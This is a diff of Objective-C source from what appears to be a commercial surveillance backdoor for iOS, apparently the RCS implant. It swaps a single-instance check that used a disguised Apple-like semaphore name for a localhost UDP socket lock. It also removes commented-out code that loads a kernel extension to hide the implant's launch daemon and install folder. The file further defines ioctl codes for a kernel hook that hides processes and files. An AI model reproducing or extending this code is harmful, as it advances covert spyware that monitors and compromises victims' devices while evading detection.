@@ -11,7 +11,8 @@
 #import <CommonCrypto/CommonDigest.h>
 #import <sys/ioctl.h>
 #import <fcntl.h>
-#import <semaphore.h>
+#import <sys/socket.h>
+#import <sys/un.h>
 
 #import "RCSICore.h"
 #import "RCSIUtils.h"
@@ -29,7 +30,6 @@
 #define BDOR_DEVICE         "/dev/pfCPU"
 #define MCHOOK_MAGIC        10
 
-#define SEM_NAME            "com.apple.mdworker_executed"
 #define GLOBAL_PERMISSIONS  0666
 
 //#define DEBUG
@@ -44,9 +44,6 @@
 #define MCHOOK_HIDEP  _IO(  MCHOOK_MAGIC, 3)
 // Hide given dir/file name
 #define MCHOOK_HIDED  _IOW( MCHOOK_MAGIC, 4, char [30])
-
-//#define DEBUG
-
 
 #pragma mark -
 #pragma mark Private Interface
@@ -583,13 +580,34 @@ RCSISharedMemory  *mSharedMemoryLogging;
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
   //
-  // Check if the backdoor is already running
+  // Lock to prevent more instance of running backdoor
   //
-  sem_t *namedSemaphore = sem_open(SEM_NAME,
-                                   O_CREAT | O_EXCL,
-                                   GLOBAL_PERMISSIONS,
-                                   1);
-  
+  if ((gLockSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) != -1) 
+    {
+      struct sockaddr_in l_addr;   
+      
+      memset(&l_addr, 0, sizeof(l_addr));
+      l_addr.sin_family = AF_INET;
+      l_addr.sin_port = htons(37173);
+      l_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+      
+      if ((bind(gLockSock, (struct sockaddr *)&l_addr, sizeof(l_addr)) == -1) && 
+          errno == EADDRINUSE) 
+        {
+#ifdef DEBUG
+          NSLog(@"%s: cannot bind socket, instance already running, errno %d", __FUNCTION__, errno);
+#endif
+          [pool release];
+          exit(-1);
+        }
+    }
+  else
+    {
+#ifdef DEBUG
+      NSLog(@"%s: error create socket, [%d] could not check running instance", __FUNCTION__, gLockSock);
+#endif
+    }
+      
   //
   // Get system version in global variables
   //
@@ -600,57 +618,6 @@ RCSISharedMemory  *mSharedMemoryLogging;
 #ifdef DEBUG
   NSLog(@"Found iOS ver %d.%d.%d", gOSMajor, gOSMinor, gOSBugFix);
 #endif
-
-  if (namedSemaphore == SEM_FAILED)
-    {
-      int err = errno;
-      
-      if (err == ENOENT || err == EEXIST)
-        {
-#ifdef DEBUG
-          warnLog(ME, @"Trying to unlink semaphore since process was killed");
-#endif
-          if (sem_unlink(SEM_NAME) == 0)
-            {
-#ifdef DEBUG
-              infoLog(ME, @"sem_unlink went ok");
-              infoLog(ME, @"Trying to recreate the semaphore");
-#endif
-              namedSemaphore = sem_open(SEM_NAME,
-                                        O_CREAT | O_EXCL,
-                                        GLOBAL_PERMISSIONS,
-                                        1);
-            
-              if (namedSemaphore == SEM_FAILED)
-                {
-#ifdef DEBUG
-                  errorLog(ME, @"An error occurred while recreating semaphore after unlink");
-#endif
-                }
-            }
-          else
-            {
-#ifdef DEBUG
-              errorLog(ME, @"An error occurred while unlinking semaphore");
-#endif
-            }
-        }
-      else
-        {
-#ifdef DEBUG
-          errorLog(ME, @"Execution check error! Backdoor is already running");
-          errorLog(ME, @"err (%d) %s", errno, strerror(errno));
-#endif
-      
-          exit(-1);
-        }
-    }
-  else
-    {
-#ifdef DEBUG
-      infoLog(ME, @"Semaphore Registered correctly");
-#endif
-    }
     
   //
   // Create and initialize the shared memory segments
@@ -690,13 +657,6 @@ RCSISharedMemory  *mSharedMemoryLogging;
   
   [mSharedMemoryLogging zeroFillMemory];
   
-  //if ([mApplicationName isEqualToString: mBinaryName])
-    //{
-      //
-      // Check if there's another backdoor running
-      //
-    //}
-  
   if ([self isBackdoorAlreadyResident] == YES)
     {
 #ifdef DEBUG    
@@ -718,26 +678,6 @@ RCSISharedMemory  *mSharedMemoryLogging;
 #endif
         }
     }
-  /* 
-  // TODO: Check if we really need to load our kext
-  [self loadKext];
-  
-  if ([self connectKext] != -1)
-    {
-      // 
-      // Start hiding all the required paths
-      // launchDaemonFile
-      // appDroppedPath == Where we have been dropped which is different than our
-      // app folder (/RCSMac.app/)
-      //
-      int ret;
-      ret = ioctl(mBackdoorFD, MCHOOK_HIDED, (char *)[[launchDaemonPath 
-                                                       lastPathComponent] fileSystemRepresentation]);
-      NSString *appDroppedPath = [[[[NSBundle mainBundle] bundlePath]
-                                   stringByDeletingLastPathComponent] lastPathComponent];
-      ret = ioctl(mBackdoorFD, MCHOOK_HIDED, (char *)[appDroppedPath fileSystemRepresentation]);
-    }
-*/
   
   //
   // Get a task Manager instance (singleton) and load the configuration
